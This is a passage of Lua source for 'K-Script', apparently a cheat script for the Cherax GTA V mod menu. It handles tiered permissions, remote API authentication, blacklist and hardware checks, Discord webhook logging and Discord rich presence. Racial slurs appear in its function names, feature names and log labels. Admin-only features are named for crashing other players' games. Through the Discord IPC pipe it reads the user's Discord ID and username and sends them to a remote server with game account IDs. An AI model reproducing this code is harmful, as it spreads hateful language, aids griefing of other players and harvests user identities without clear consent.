        ("Banned User tried to load K-Script, Banned UID: %i, SC Name: %s"):format(Cherax.GetUID(), SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME())
      )
    end

    if yieldWhileWaiting then
      Script.Yield(1500)
    end

    FuckTheniggersGame()
    return
  end

  isAdmin = tableContainsValue(AdmanUIDs, Cherax.GetUID())
  isModerator = tableContainsValue(moderatorUIDs, Cherax.GetUID())
  isSupporter = isAdmin or isModerator or tableContainsValue(supporterUIDs, Cherax.GetUID())

  if not wasSupporter and not wasAdmin and not wasModerator and (isSupporter or isAdmin or isModerator) and featuresRemoved then
    GUI.AddToast("K-Script", "Permission upgrade detected, please reload the Script!\nUnloading...", 20000, eToastPos.TOP_RIGHT)
    Logger.Log(eLogColor.GREEN, "K-Script", "Permission upgrade detected, please reload the Script! Unloading...")
    SetShouldUnload()
    return
  end

  wasSupporter = isSupporter
  wasAdmin = isAdmin
  wasModerator = isModerator

  if not isSupporter and not isAdmin and not isModerator and not featuresRemoved then
    removeFreeUserFeatures()
  end

  if not isAdmin and not isDev then
    removeFeatureByName("EnableAdminFeatures")
    removeFeatureByName("DisableAdminFeatureEnable")
    removePlayerFeatureArray("remoteunload")
    removePlayerFeatureArray("niggercrash")
    removePlayerFeatureArray("4/66 cwash")
    removePlayerFeatureArray("Tractorcrash")
  end

  if not isDev and not isAdmin and not isModerator then
    removeFeatureByName("notifyToggle")
  end

  if not featuresRemoved then
    local ok, enabled = pcall(function()
      return FeatureMgr.IsFeatureEnabled(Utils.Joaat("poolToggle"))
    end)
    isInPool = ok and enabled == true
  end

  if not logOnce then
    if isDev then
      Logger.Log(eLogColor.GREEN, "K-Script", "Developer Permissions Granted!")
    elseif isAdmin then
      Logger.Log(eLogColor.GREEN, "K-Script", "Adman Permissions Granted!")
    elseif isModerator then
      Logger.Log(eLogColor.GREEN, "K-Script", "Moderator Permissions Granted!")
    elseif isSupporter then
      Logger.Log(eLogColor.GREEN, "K-Script", "Donator Permissions Granted!")
    else
      Logger.Log(eLogColor.GREEN, "K-Script", "Free User Permissions Granted!")
    end

    logOnce = true
  end

  finishInitialAuth("FetchUserPermissions", SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME())
end

function AuthenticateToAPI(clientName)
  if ShouldUnload() then
    return
  end

  if type(PrimeDiscordIdentityForAuth) == "function" then
    pcall(PrimeDiscordIdentityForAuth)
  end

  local rockstarId = getLocalRockstarId()
  if tostring(rockstarId):find("Error:", 1, true) then
    rockstarId = "error"
  end

  local payload = json.encode({
    client_name = ("%s(%i)"):format(clientName or "Unknown", Cherax.GetUID()),
    rockstar_id = tostring(rockstarId),
    cherax_uid = Cherax.GetUID(),
    discord_id = tostring(discordID),
    discord_user_name = tostring(discordUserName),
    asset_path = tostring(natives),
    game_version = tostring(Cherax.GetEdition()),
  })

  local curl = Curl.Easy()
  curl:Setopt(eCurlOption.CURLOPT_URL, API_BASE .. "/auth")
  curl:AddHeader("Content-Type: application/json")
  curl:AddHeader("X-SECRET-KEY: " .. AUTH_SECRET)
  curl:AddHeader(("x-script-token: %s"):format(scriptToken))
  curl:Setopt(eCurlOption.CURLOPT_POSTFIELDS, payload)
  curl:Setopt(eCurlOption.CURLOPT_POST, 1)
  curl:Setopt(eCurlOption.CURLOPT_USERAGENT, "K-Script V38")
  curl:DisableErrorLog()
  curl:Perform()

  local startedAt = os.clock()
  while not curl:GetFinished() do
    if os.clock() - startedAt >= 8 then
      GUI.AddToast("K-Script", "Authentication failed: Request timed out after 9 seconds.\nContact a K-Script Developer", 20000, eToastPos.TOP_RIGHT)
      Logger.Log(eLogColor.RED, "K-Script", "Authentication timed out after 8 seconds")
      SetShouldUnload()
      return
    end

    Script.Yield(10)
  end

  local code, response = curl:GetResponse()
  response = response or ""

  if code ~= eCurlCode.CURLE_OK then
    if response:find("VPN Reject", 1, true) then
      GUI.AddToast("K-Script", "Authentication failed, VPNs/Proxies from Asia are not allowed!", 25000, eToastPos.TOP_RIGHT)
      Logger.Log(eLogColor.RED, "K-Script", "Authentication failed, VPNs/Proxies from Asia are not allowed!")
    else
      GUI.AddToast(
        "K-Script",
        ("Authentication failed, bad response from Server (%i)\nContact a K-Script Developer and send your Cherax.log!"):format(code),
        20000,
        eToastPos.TOP_RIGHT
      )
      Logger.Log(eLogColor.RED, "K-Script", ("Authentication failed, bad response from Server (%i) (%s)"):format(code, tostring(response)))
    end

    SetShouldUnload()
    return
  end

  local ok, decoded = pcall(json.decode, response)
  if not ok or type(decoded) ~= "table" then
    GUI.AddToast("K-Script", "Authentication failed, invalid JSON response from server.\nContact a K-Script Developer", 20000, eToastPos.TOP_RIGHT)
    Logger.Log(eLogColor.RED, "K-Script", ("Authentication failed, could not decode JSON response: %s | Body: %s"):format(tostring(decoded), tostring(response)))
    SetShouldUnload()
    return
  end

  if decoded.error then
    local errorText = tostring(decoded.error)
    if errorText:find("VPN Reject", 1, true) then
      GUI.AddToast("K-Script", "Authentication failed, VPNs/Proxies from Asia are not allowed!", 25000, eToastPos.TOP_RIGHT)
      Logger.Log(eLogColor.RED, "K-Script", "Authentication failed, VPNs/Proxies from Asia are not allowed!")
    else
      GUI.AddToast("K-Script", ("Authentication failed: %s"):format(errorText), 20000, eToastPos.TOP_RIGHT)
      Logger.Log(eLogColor.RED, "K-Script", ("Authentication failed: %s"):format(errorText))
    end

    SetShouldUnload()
    return
  end

  apiKey = decoded.apiKey
  detectedCountry = decoded.country or "Unknown"

  if not apiKeyReady() then
    GUI.AddToast("K-Script", "Authentication failed, server did not return Authentication Data.\nContact a K-Script Developer", 20000, eToastPos.TOP_RIGHT)
    Logger.Log(eLogColor.RED, "K-Script", ("Authentication failed, missing Authentication data in response: %s"):format(tostring(response)))
    SetShouldUnload()
    return
  end

  if isDev then
    Logger.Log(eLogColor.GREEN, "K-Script", ("Authenticated successfully. Country: %s, APIKey: %s"):format(tostring(detectedCountry), apiKey))
  end
end

function FetchAdminRIDList()
  local function request()
    if not ensureApiAuthenticated("FetchAdminRIDList", SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME()) then
      return
    end

    local curl = Curl.Easy()
    curl:Setopt(eCurlOption.CURLOPT_URL, API_BASE .. "/get_admin_rid_list")
    addAuthHeaders(curl)
    curl:Setopt(eCurlOption.CURLOPT_USERAGENT, "K-Script V27")
    curl:DisableErrorLog()
    curl:Perform()

    if not waitForCurl(curl, 5) then
      return
    end

    local code, response = curl:GetResponse()
    response = response or ""

    if responseNeedsApiRefresh(response) then
      if refreshApiKey("FetchAdminRIDList", SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME()) then
        Script.QueueJob(request)
      end
      return
    end

    if code ~= eCurlCode.CURLE_OK or response:find("error", 1, true) then
      Logger.LogError("K-Script: Fatal Error Occurred (FARL), unloading...")

      if isAdmin then
        Logger.LogError(("(FetchAdminRIDList) K-Script: WebServer Response Code: %i, ResponseBody: %s"):format(code, response))
      end

      if responseIsUnauthorized(response) then
        Logger.LogError("K-Script: Session Ticket Revoked!")
        FuckTheniggersGame()
      end

      SetShouldUnload()
      return
    end

    adminRIDList = {}
    for rid in response:gmatch('"(%d+)"') do
      adminRIDList[#adminRIDList + 1] = rid
    end

    if isDev then
      Logger.LogInfo(("[FetchAdminRIDList] Loaded %d entries."):format(#adminRIDList))
    end

    Script.Yield()
  end

  Script.QueueJob(request)
end

function FetchBlacklistRIDList()
  local function request()
    if not ensureApiAuthenticated("FetchBlacklistRIDList", SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME()) then
      return
    end

    local curl = Curl.Easy()
    curl:Setopt(eCurlOption.CURLOPT_URL, API_BASE .. "/getBlacklist")
    addAuthHeaders(curl)
    curl:Setopt(eCurlOption.CURLOPT_USERAGENT, "K-Script V16")
    curl:DisableErrorLog()
    curl:Perform()

    if not waitForCurl(curl, 5, 16) then
      Logger.LogError("K-Script: Timeout reached in FBRL! Unloading...")
      SetShouldUnload()
      return
    end

    local code, response = curl:GetResponse()
    response = response or ""

    if responseNeedsApiRefresh(response) then
      if refreshApiKey("FetchBlacklistRIDList", SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME()) then
        Script.QueueJob(request)
      end
      return
    end

    if code ~= eCurlCode.CURLE_OK or response:find('"error"', 1, true) then
      Logger.LogError("K-Script: Fatal Error Occurred (FBRL), unloading...")

      if isAdmin then
        Logger.LogError(("(FetchBlacklistRIDList) curlCode: %s, ResponseBody: %s"):format(tostring(code), response))
      end

      if responseIsUnauthorized(response) then
        Logger.LogError("K-Script: Session Ticket Revoked!")
        FuckTheniggersGame()
      end

      SetShouldUnload()
      return
    end

    local listText = response:match('"blacklist_rid_list"%s*:%s*%[(.-)%]')
    if listText == nil then
      Logger.LogError(isAdmin and "Blacklist response missing blacklist_rid_list array." or "FBRL response incomplete!")
      SetShouldUnload()
      return
    end

    blacklistRIDList = {}
    local loaded = 0

    for value in listText:gmatch("(%d+)") do
      local rid = tonumber(value)
      if rid then
        blacklistRIDList[rid] = true
        loaded = loaded + 1

        if tostring(rid) == getLocalRockstarId() and type(SendToDiscord) == "function" then
          SendToDiscord("fuckniggers", ("%s(%d) blacklisted RID tried to load K-Script!"):format(SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME(), rid))
        end
      end
    end

    if isDev then
      Logger.LogInfo(("[FetchBlacklistRIDList] Loaded %d entries."):format(loaded))
    end

    Script.Yield()
  end

  Script.QueueJob(request)
end

modderDB = {}
modderDBMap = {}

local function parseModderDatabaseEntries(response)
  local decodedOk, decoded = pcall(json.decode, response)
  if decodedOk and type(decoded) == "table" and type(decoded.modderDBList) == "table" then
    return decoded.modderDBList
  end

  local listText = tostring(response):match('"modderDBList"%s*:%s*%[(.-)%]')
  if listText == nil then
    return nil
  end

  local entries = {}
  for objectText in listText:gmatch("{(.-)}") do
    entries[#entries + 1] = {
      menu = objectText:match('"menu"%s*:%s*"(.-)"'),
      id = objectText:match('"id"%s*:%s*"(.-)"') or objectText:match('"id"%s*:%s*(%d+)'),
    }
  end

  return entries
end

function FetchModderDatabase()
  local function request()
    if not ensureApiAuthenticated("FetchModderDatabase", SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME()) then
      return
    end

    local curl = Curl.Easy()
    curl:Setopt(eCurlOption.CURLOPT_URL, API_BASE .. "/getLexisDB")
    addAuthHeaders(curl)
    curl:Setopt(eCurlOption.CURLOPT_USERAGENT, "K-Script V61")
    curl:DisableErrorLog()
    curl:Perform()

    if not waitForCurl(curl, 5, 16) then
      Logger.LogError("K-Script: Timeout reached in FMDB! unloading...")
      SetShouldUnload()
      return
    end

    local code, response = curl:GetResponse()
    response = response or ""

    if responseNeedsApiRefresh(response) then
      if refreshApiKey("FetchModderDatabase", SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME()) then
        Script.QueueJob(request)
      end
      return
    end

    if code ~= eCurlCode.CURLE_OK or response:find('"error"', 1, true) then
      Logger.LogError("K-Script: Fatal Error Occurred in FMDB, unloading...")

      if isAdmin then
        Logger.LogError(("(FetchModderDatabase) curlCode: %s, ResponseBody: %s"):format(tostring(code), response))
      end

      if responseIsUnauthorized(response) then
        Logger.LogError("K-Script: Session Ticket Revoked!")
        FuckTheniggersGame()
      end

      SetShouldUnload()
      return
    end

    local entries = parseModderDatabaseEntries(response)
    if entries == nil then
      if isDev then
        Logger.LogError("ModderDB response missing modderDBList array.")
        Logger.LogError("ResponseBody: " .. response)
      end

      Logger.LogError("K-Script: FMDB response incomplete! unloading...")
      SetShouldUnload()
      return
    end

    modderDB = {}
    modderDBMap = {}

    for _, entry in ipairs(entries) do
      local rid = entry.id or entry.rid
      if rid ~= nil then
        rid = tostring(rid)
        local numericRid = rid:match("^%d+$") and tonumber(rid) or nil
        if numericRid and numericRid <= 9007199254740991 then
          rid = tostring(numericRid)
        end

        if modderDBMap[rid] == nil then
          local menuName = entry.menu or "Unknown"
          modderDB[#modderDB + 1] = {
            rid = rid,
            menu = menuName,
          }
          modderDBMap[rid] = menuName
        end
      end
    end

    if isDev then
      Logger.LogInfo(("[FetchModderDatabase] Loaded %d entries."):format(#modderDB))
    end

    Script.Yield()
  end

  Script.QueueJob(request)
end

function HardwareCheck(payload)
  local function request(requestPayload)
    if not ensureApiAuthenticated("HardwareCheck", SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME()) then
      return
    end

    local curl = Curl.Easy()
    curl:Setopt(eCurlOption.CURLOPT_URL, API_BASE .. "/hardwareCheck")
    addAuthHeaders(curl)
    curl:AddHeader("User-Agent: K-Script V38")
    curl:Setopt(eCurlOption.CURLOPT_POST, 1)
    curl:Setopt(eCurlOption.CURLOPT_POSTFIELDS, json.encode(requestPayload))
    curl:Setopt(eCurlOption.CURLOPT_USERAGENT, "K-Script V83")
    curl:DisableErrorLog()
    curl:Perform()

    if not waitForCurl(curl, 5) then
      return
    end

    local code, response = curl:GetResponse()
    response = response or ""

    if responseNeedsApiRefresh(response) then
      if refreshApiKey("HardwareCheck", SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME()) then
        Script.QueueJob(request, requestPayload)
      end
      return
    end

    if code ~= eCurlCode.CURLE_OK then
      if isAdmin then
        Logger.LogError(("(HardwareCheck) CURL Code: %i, Response: %s"):format(code, response))
      end
      SetShouldUnload()
      return
    end

    local ok, decoded = pcall(json.decode, response)
    if not ok or type(decoded) ~= "table" or decoded.status == nil then
      Logger.LogError("K-Script: Invalid HW check response, unloading...")
      SetShouldUnload()
      return
    end

    if decoded.status == "OK" then
      return
    end

    if decoded.status == "MISMATCH" then
      GUI.AddToast("K-Script Security", "Hardware mismatch detected!\nPlease contact support for a HWID reset! unloading...", 20000, eToastPos.TOP_RIGHT)
      Logger.LogError("K-Script: Hardware mismatch detected.")
      SetShouldUnload()
      return
    end

    if decoded.status == "LOCKED" then
      GUI.AddToast("K-Script Security", "Hardware mismatch detected!\nPlease contact support for a HWID reset! unloading...", 20000, eToastPos.TOP_RIGHT)
      Logger.LogError("K-Script: Hardware locked.")
      Logger.LogError("Access denied. Contact support.")
      SetShouldUnload()
      return
    end

    if isAdmin or isDev then
      Logger.LogError(("K-Script: Unknown HW check status '%s'"):format(tostring(decoded.status)))
    end

    SetShouldUnload()
  end

  Script.QueueJob(request, payload)
end

attempts = 0

function SendToDiscord(kind, content, _isImportant, socialClubName, rockstarId)
  socialClubName = socialClubName or SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME()
  rockstarId = rockstarId or getLocalRockstarId()

  local function request(requestKind, requestContent, requestSocialClubName, requestRockstarId)
    if not ensureApiAuthenticated("SendToDiscord", requestSocialClubName) then
      return
    end

    local rid = tostring(requestRockstarId or "unknown_rid")
    if rid:find("Error", 1, true) then
      rid = "hb_Error"
    end

    local payload = {
      discord_payload = {
        content = ("```%s```"):format(requestContent),
        username = "K-Script Log Info",
        avatar_url = "https://c.wallhere.com/photos/7b/09/4782x3822_px_Grand_Theft_Auto_V_logo-786783.jpg!d",
      },
      client_name = ("%s(%i)"):format(storedSCName or requestSocialClubName or "Unknown", Cherax.GetUID()),
      rockstar_id = rid,
      cherax_uid = Cherax.GetUID(),
      kind = requestKind,
    }

    local curl = Curl.Easy()
    curl:Setopt(eCurlOption.CURLOPT_URL, API_BASE .. "/info")
    addAuthHeaders(curl)
    curl:Setopt(eCurlOption.CURLOPT_POSTFIELDS, json.encode(payload))
    curl:Setopt(eCurlOption.CURLOPT_POST, 1)
    curl:Setopt(eCurlOption.CURLOPT_USERAGENT, "K-Script V83")
    curl:DisableErrorLog()
    curl:Perform()

    if not waitForCurl(curl, 10) then
      return
    end

    local code, response = curl:GetResponse()
    response = response or ""

    if externalTamperDetected then
      Logger.LogError("K-Script: external File Tamper detected! What do you think youre doing here pal?")
      FuckTheniggersGame()
      return
    end

    if responseNeedsApiRefresh(response) then
      if refreshApiKey("SendToDiscord", requestSocialClubName) then
        Script.QueueJob(request, requestKind, requestContent, requestSocialClubName, requestRockstarId)
      end
      return
    end

    if response:find("The payload contains blacklisted content", 1, true) then
      Logger.LogError("Suspicious Activity detected!")
      FuckTheniggersGame()
      return
    end

    if code ~= eCurlCode.CURLE_OK or response:find("error", 1, true) then
      if isAdmin then
        Logger.LogError(("(WebHook Proxy) K-Script: WebServer Response Code: %i, ResponseBody: %s"):format(code, response))
      end

      if attempts <= 3 then
        attempts = attempts + 1
        Script.QueueJob(request, requestKind, requestContent, requestSocialClubName, requestRockstarId)
        return
      end

      if responseIsUnauthorized(response) then
        Logger.LogError("K-Script: Session Ticket Revoked!")
        FuckTheniggersGame()
        return
      end

      Logger.LogError(code ~= eCurlCode.CURLE_OK and "K-Script: Fatal Error Occurred (STD), unloading..." or "K-Script: Fatal Error #6 Occurred, unloading...")
      SetShouldUnload()
      return
    end

    attempts = 0
    Script.Yield()
  end

  Script.QueueJob(request, kind, content, socialClubName, rockstarId)
end

function notifyUnload(_kind, content, socialClubName)
  if not ensureApiAuthenticated("notifyUnload", socialClubName) then
    return
  end

  local rockstarId = getLocalRockstarId()
  if tostring(rockstarId):find("Error:", 1, true) then
    rockstarId = "hb_Error"
  end

  local payload = {
    discord_payload = {
      content = ("```%s```"):format(content),
      username = "K-Script Log Info",
      avatar_url = "https://c.wallhere.com/photos/9b/21/6904x5044_px_Grand_Theft_Auto_V_logo-908905.jpg!d",
    },
    client_name = ("%s(%i)"):format(socialClubName or "Unknown", Cherax.GetUID()),
    rockstar_id = tostring(rockstarId),
  }

  local curl = Curl.Easy()
  curl:Setopt(eCurlOption.CURLOPT_URL, API_BASE .. "/info")
  addAuthHeaders(curl)
  curl:Setopt(eCurlOption.CURLOPT_POSTFIELDS, json.encode(payload))
  curl:Setopt(eCurlOption.CURLOPT_POST, 1)
  curl:Setopt(eCurlOption.CURLOPT_USERAGENT, "K-Script V83")
  curl:DisableErrorLog()
  curl:Perform()
  waitForCurl(curl, 0)
end

function intToIp(value)
  return string.format(
    "%d.%d.%d.%d",
    (value >> 24) & 0xff,
    (value >> 16) & 0xff,
    (value >> 8) & 0xff,
    value & 0xff
  )
end

rpc = {
  active = false,
  pipe = nil,
  startTimestamp = 0,
  pid = 1234,
}

local function rpcLog(message)
  if isDev then
    Logger.LogInfo("[Discord RPC] " .. tostring(message))
  end
end

local function rpcSendIpc(opcode, payload)
  if rpc.pipe == nil then
    rpcLog(("send failed: no pipe, op=%s"):format(tostring(opcode)))
    return false
  end

  local encoded = json.encode(payload)
  local ok, errorMessage = pcall(function()
    rpc.pipe:write(string.pack("<II", opcode, #encoded))
    rpc.pipe:write(encoded)
    rpc.pipe:flush()
  end)

  if not ok then
    rpcLog(("send failed: op=%s err=%s payload=%s"):format(tostring(opcode), tostring(errorMessage), tostring(encoded)))
    return false
  end

  rpcLog(("sent ipc: op=%s bytes=%d"):format(tostring(opcode), #encoded))
  return true
end

local function rpcReadIpc()
  if rpc.pipe == nil then
    rpcLog("read failed: no pipe")
    return false, "no_pipe"
  end

  local header = rpc.pipe:read(8)
  if header == nil then
    rpcLog("read failed: no header")
    return false, "no_header"
  end

  local opcode, length = string.unpack("<II", header)
  rpcLog(("read header: op=%s len=%s"):format(tostring(opcode), tostring(length)))

  local body = rpc.pipe:read(length)
  if body == nil then
    rpcLog(("read failed: no body, expected len=%s"):format(tostring(length)))
    return false, "no_body"
  end

  local ok, decoded = pcall(json.decode, body)
  if ok and decoded then
    rpcLog(("read decoded body: %s"):format(json.encode(decoded)))
    return true, opcode, decoded, body
  end

  rpcLog(("read raw body, json decode failed or empty: %s"):format(tostring(body)))
  return true, opcode, nil, body
end

local function openDiscordPipe()
  for index = 0, 9 do
    local path = "\\\\.\\pipe\\discord-ipc-" .. index
    rpcLog(("trying pipe: %s"):format(path))

    local pipe = io.open(path, "r+b")
    if pipe then
      rpcLog(("opened pipe: %s"):format(path))
      return pipe
    end
  end

  rpcLog("failed to open any Discord IPC pipe")
  return nil
end

function rpc_handshake()
  rpcLog("starting handshake")

  local ok = rpcSendIpc(0, {
    v = 1,
    client_id = "0302544816506248862",
  })

  if not ok then
    rpcLog("handshake failed: could not send handshake packet")
    return false
  end

  local readOk, readOpcode, decoded, rawBody = rpcReadIpc()
  if not readOk then
    rpcLog(("handshake failed while reading: %s"):format(tostring(readOpcode)))
    return false
  end

  if decoded then
    rpcLog("handshake response decoded")
    rpcLog(("decoded Discord response: %s"):format(json.encode(decoded)))

    local data = decoded.data or {}
    local user = data.user or {}
    local config = data.config or {}

    discordID = user.id
    discordUserName = user.username

    rpcLog(
      ("READY: cmd=%s evt=%s data_v=%s user=%s global=%s id=%s premium=%s env=%s api=%s cdn=%s"):format(
        tostring(decoded.cmd),
        tostring(decoded.evt),
        tostring(data.v),
        tostring(user.username),
        tostring(user.global_name),
        tostring(user.id),
        tostring(user.premium_type),
        tostring(config.environment),
        tostring(config.api_endpoint),
        tostring(config.cdn_host)
      )
    )
  else
    rpcLog(("handshake response was not decoded, raw=%s"):format(tostring(rawBody)))
  end

  return true, rawBody
end

local function clearDiscordActivity()
  rpcLog("clearing Discord activity")

  local payload = {
    cmd = "SET_ACTIVITY",
    args = {
      pid = rpc.pid,
      activity = nil,
    },
    nonce = tostring(os.time() * 1000),
  }

  local ok, errorMessage = pcall(function()
    rpcSendIpc(1, payload)
  end)

  if not ok then
    rpcLog(("clear activity failed: %s"):format(tostring(errorMessage)))
  end
end

local nextPresenceIndex = 1

local function nextPresenceDetails()
  if poopStatusMessages[nextPresenceIndex] == nil then
    rpcLog(("missing troll state at index=%s total=%s"):format(tostring(nextPresenceIndex), tostring(#poopStatusMessages)))
  end

  local details = poopStatusMessages[nextPresenceIndex]
  nextPresenceIndex = nextPresenceIndex + 1

  if nextPresenceIndex > #poopStatusMessages then
    nextPresenceIndex = 1
  end

  return details
end

local function buildDiscordActivity()
  local state
  if numConnectedPlayers > 0 then
    state = ("In a Session with %d players (%s)"):format(numConnectedPlayers, isGameVersionEnhanced and "Enhanced" or "Legacy")
  else
    state = "In Story Mode"
  end

  return {
    details = nextPresenceDetails(),
    state = state,
    timestamps = {
      start = rpc.startTimestamp * 1000,
    },
    assets = {
      large_image = "kyuubii0",
      large_text = "crashing fools is a top priority!",
    },
    buttons = discordButtons,
    instance = true,
  }
end

function EnableDiscordRPC()
  if rpc.active then
    rpcLog("enable skipped: RPC already active")
    return
  end

  rpcLog("enabling Discord RPC")
  rpc.pipe = openDiscordPipe()

  if rpc.pipe == nil then
    discordID = "Discord isnt running"
    discordUserName = "error"
    rpcLog("enable failed: Discord pipe not found")
    return
  end

  if not rpc_handshake() then
    rpcLog("enable failed: handshake failed")
    pcall(function()
      rpc.pipe:close()
    end)
    rpc.pipe = nil
    discordID = "Discord Handshake failed"
    discordUserName = "error"
    return
  end

  rpc.active = true
  rpc.startTimestamp = os.time()
  rpc.pid = 1234

  rpcLog(("RPC enabled: pid=%s startTimestamp=%s"):format(tostring(rpc.pid), tostring(rpc.startTimestamp)))

  local activity = buildDiscordActivity()
  rpcLog(("initial activity: %s"):format(json.encode(activity)))

  local ok, errorMessage = pcall(function()
    local sent = rpcSendIpc(1, {
      cmd = "SET_ACTIVITY",
      args = {
        pid = rpc.pid,
        activity = activity,
      },
      nonce = tostring(rpc.startTimestamp * 1000),
    })

    if not sent then
      error("rpc_send_ipc returned false")
    end
  end)

  if not ok then
    rpcLog(("initial SET_ACTIVITY failed: %s"):format(tostring(errorMessage)))
    DisableDiscordRPC()
    return
  end

  rpcLog("initial SET_ACTIVITY sent")

  Script.QueueJob(function()
    rpcLog("presence update loop started")

    while rpc.active and not ShouldUnload() do
      local updateActivity = buildDiscordActivity()
      local updatePayload = {
        cmd = "SET_ACTIVITY",
        args = {
          pid = rpc.pid,
          activity = updateActivity,
        },
        nonce = tostring(os.time() * 1000),
      }

      local updateOk, updateError = pcall(function()
        if not rpcSendIpc(1, updatePayload) then
          error("rpc_send_ipc returned false")
        end
      end)

      if not updateOk then
        rpcLog(("presence update failed: %s"):format(tostring(updateError)))
        DisableDiscordRPC()
        return
      end

      Script.Yield(10000)
    end

    rpcLog("presence update loop stopped")
  end)
end

function DisableDiscordRPC()
  if not rpc.active and rpc.pipe == nil then
    rpcLog("disable skipped: RPC already inactive")
    return
  end

  rpcLog("disabling Discord RPC")
  rpc.active = false
  Script.Yield(100)

  if rpc.pipe then
    pcall(clearDiscordActivity)

    local ok, errorMessage = pcall(function()
      rpc.pipe:close()
    end)

    if ok then
      rpcLog("pipe closed")
    else
      rpcLog(("pipe close failed: %s"):format(tostring(errorMessage)))
    end

    rpc.pipe = nil
  end

  rpcLog("Discord RPC disabled")
end

function DiscordOAuthAuthorize()
  local nonce = tostring(os.time() * 1000)
  local payload = {
    cmd = "AUTHORIZE",
    args = {
      client_id = "0302544816506248862",
      scopes = { "identify" },
    },
    nonce = nonce,
  }

  if not rpcSendIpc(1, payload) then
    return false, "send_failed"
  end

  while true do
    local ok, errorOrOpcode, decoded = rpcReadIpc()
    if not ok then
      return false, errorOrOpcode
    end

    if decoded and decoded.nonce == nonce then
      if decoded.evt == "ERROR" then
        return false, decoded.data
      end

      if decoded.data and decoded.data.code then
        return true, decoded.data.code
      end

      return false, decoded
    end
  end
end

function HasDiscordRpcIdentityReady()
  return discordRpcIdentityReady == true
end

function MarkDiscordRpcIdentityReady()
  discordRpcIdentityReady = true
end

function PrimeDiscordIdentityForAuth()
  if HasDiscordRpcIdentityReady() then
    return true
  end

  local ok, errorMessage = pcall(function()
    if discordID == nil or discordUserName == nil then
      EnableDiscordRPC()

      local rpcFeature
      pcall(function()
        rpcFeature = FeatureMgr.GetFeature(Utils.Joaat("discordRPCToggle"))
      end)

      if rpcFeature == nil or not rpcFeature:IsToggled() then
        DisableDiscordRPC()
      end
    end
  end)

  if not ok then
    if discordID == nil then
      discordID = "Discord RPC init failed"
    end
    if discordUserName == nil then
      discordUserName = "error"
    end

    if isDev or isAdmin then
      Logger.LogError(("[Discord RPC] identity init failed before auth: %s"):format(tostring(errorMessage)))
    end
  end

  MarkDiscordRpcIdentityReady()
  return ok
end

toasts = {}
overflowQueue = {}
nextToastId = 1

downloadUrlTexture = "https://kyuubii.dev/cherax/lua/kyuubii.png"
textureName = "kyuubii.png"
DownloadAndSaveLuaAssets(downloadUrlTexture, textureName)

texturePath = FileMgr.GetMenuRootPath() .. "\\Lua\\K-Script\\kyuubii.png"
toastImageId = Texture.LoadTexture(texturePath)
toastTexture = Texture.GetTexture(toastImageId)

Titlecolor = FeatAdd(Utils.Joaat("TitleColor"), "Title Color", eFeatureType.InputColor4, "Color of the toast title")
messagecolor = FeatAdd(Utils.Joaat("MessageColor"), "Message Color", eFeatureType.InputColor4, "Color of the toast message")
Titlecolor:SetColor(255, 255, 255, 255)
messagecolor:SetColor(255, 255, 255, 255)

presetToggle = FeatAdd(Utils.Joaat("ToggleOption"), "Use Preset Position", eFeatureType.Toggle, "Use a preset anchor position")
presetToggle:SetBoolValue(true)

positionOptions = {
  "Top Center",
  "Bottom Center",
  "Left Middle",
  "Right Middle",
}

toastPosition = FeatAdd(Utils.Joaat("ToastPresetPos"), "Toast Position", eFeatureType.Combo, "Preset anchor position")
toastPosition:SetList(positionOptions)
toastPosition:SetListIndex(0)

toastXOffset = FeatAdd(Utils.Joaat("ToastXOffset"), "X Offset", eFeatureType.SliderFloat, "Manual X position")
toastYOffset = FeatAdd(Utils.Joaat("ToastYOffset"), "Y Offset", eFeatureType.SliderFloat, "Manual Y position")

fadeOutDuration = FeatAdd(Utils.Joaat("FadeOutDuration"), "Fade Out Duration", eFeatureType.SliderFloat, "How long the fade-out takes")
fadeOutDuration:SetMinValue(0.1)
fadeOutDuration:SetMaxValue(5)
fadeOutDuration:SetFloatValue(2)

progressBgColor = FeatAdd(Utils.Joaat("ProgressBarBG"), "Progress Bar Background", eFeatureType.InputColor4, "Progress bar background color")
progressFgColor = FeatAdd(Utils.Joaat("ProgressBarFG"), "Progress Bar Fill", eFeatureType.InputColor4, "Progress bar fill color")
progressBgColor:SetColor(0, 0, 0, 255)
progressFgColor:SetColor(255, 0, 0, 255)

ToastColor = FeatAdd(Utils.Joaat("ToastBG"), "Toast Background", eFeatureType.InputColor4, "Toast background color")
ToastColor:SetColor(0, 0, 0, 255)

anchorX = nil
anchorY = nil

function updateToastAnchors()
  local screenWidth, screenHeight = ImGui.GetDisplaySize()

  toastXOffset:SetMinValue(0)
  toastXOffset:SetMaxValue(screenWidth)
  toastYOffset:SetMinValue(0)
  toastYOffset:SetMaxValue(screenHeight)

  if presetToggle:IsToggled() then
    local presetIndex = toastPosition:GetListIndex() or 0
    if presetIndex == 0 then
      anchorX = screenWidth / 2
      anchorY = screenHeight * 0.05
    elseif presetIndex == 1 then
      anchorX = screenWidth / 2
      anchorY = screenHeight * 0.85
    elseif presetIndex == 2 then
      anchorX = screenWidth * 0.1
      anchorY = screenHeight / 2
    else
      anchorX = screenWidth * 0.9
      anchorY = screenHeight / 2
    end
  else
    anchorX = toastXOffset:GetFloatValue()
    anchorY = toastYOffset:GetFloatValue()
  end
end

function formatToastMessage(message, count)
  count = count or 1
  if count > 1 then
    return ("%s (%dx)"):format(message, count)
  end
  return message
end

function calcTextWidth(text)
  local width = ImGui.CalcTextSize(tostring(text or ""))
  return width or 0
end

local function clamp(value, minValue, maxValue)
  if value < minValue then return minValue end
  if value > maxValue then return maxValue end
  return value
end

local function scaledPadding(screenHeight)
  return math.max(screenHeight * 0.025, 18)
end

local function currentToastPreset()
  if presetToggle and presetToggle:IsToggled() and toastPosition then
    return toastPosition:GetListIndex() or 0
  end
  return nil
end

function calcToastMaxWidth(screenWidth, screenHeight)
  local edgePadding = scaledPadding(screenHeight)
  local hardMax = math.min(screenWidth * 0.82, 920)
